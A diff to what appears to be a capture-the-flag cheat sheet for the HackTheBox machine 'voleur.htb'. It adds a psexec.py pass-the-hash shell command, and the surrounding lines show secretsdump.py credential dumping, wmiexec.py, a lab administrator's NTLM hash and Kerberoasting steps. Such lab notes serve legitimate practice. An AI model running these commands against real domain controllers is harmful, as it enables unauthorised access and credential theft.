@@ -988,6 +988,9 @@ secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
 # command  get shell by wmiexec.py
 wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
 
+# command  get shell by psexec.py
+psexec.py -hashes :e656e07c56d831611b577b160b259ad2 -k "voleur.htb/administrator@dc.voleur.htb"
+
 # command  Kerberoasting ( auth with kerberoas when NTLM dissable )  by targetedKerberoast.py
 impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.7             ( Saving ticket in svc_ldap.ccache) 
 export KRB5CCNAME=svc_ldap.ccache
